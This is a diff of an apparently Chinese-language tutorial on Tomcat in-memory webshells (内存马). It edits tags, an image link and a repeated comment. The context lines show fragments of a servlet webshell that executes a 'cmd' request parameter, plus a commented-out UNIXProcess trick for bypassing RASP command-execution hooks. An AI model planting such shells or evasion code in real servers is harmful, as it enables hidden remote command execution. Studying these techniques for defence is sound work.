@@ -6,6 +6,7 @@ categories:
 - java
 - 内存马
 tags:
+- Tomcat
 - 内存马
 img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8131.jpg
 
@@ -244,7 +245,7 @@ connector.getService().getContainer().getPipeline().getFirst().invoke(request, r
 
 其中getContatianer是返回engine，这一步就对应了上图connector转交给Engine处理的过程
 
-![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250220113532562.png)
+![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20250308170017949.png)
 
 connector.getService()返回StandardService
 
@@ -320,7 +321,7 @@ allocate()内，如果满足if条件，会调用loadServlet，虽然这里不会
             String cmdParamName = "cmd";
             String cmd;
             if ((cmd = servletRequest.getParameter(cmdParamName)) != null){
-////UNIXProcessImpl 绕过ProcessImpl.start、Runtime.exec RASP，详情搜索JNI
+////UNIXProcessImpl 绕过ProcessImpl.start、Runtime.exec RASP
 //            Class<?> cls = null;
 //            try {
 //                cls = Class.forName("java.lang.UNIXProcess");
@@ -456,7 +457,7 @@ allocate()内，如果满足if条件，会调用loadServlet，虽然这里不会
             String cmdParamName = "cmd";
             String cmd;
             if ((cmd = servletRequest.getParameter(cmdParamName)) != null){
-////UNIXProcessImpl 绕过ProcessImpl.start、Runtime.exec RASP，详情搜索JNI
+////UNIXProcessImpl 绕过ProcessImpl.start、Runtime.exec RASP
 //            Class<?> cls = null;
 //            try {
 //                cls = Class.forName("java.lang.UNIXProcess");
@@ -590,7 +591,7 @@ allocate()内，如果满足if条件，会调用loadServlet，虽然这里不会
             String cmdParamName = "cmd";
             String cmd;
             if ((cmd = servletRequest.getParameter(cmdParamName)) != null){
-////UNIXProcessImpl 绕过ProcessImpl.start、Runtime.exec RASP，详情搜索JNI
+////UNIXProcessImpl 绕过ProcessImpl.start、Runtime.exec RASP
 //            Class<?> cls = null;
 //            try {
 //                cls = Class.forName("java.lang.UNIXProcess");
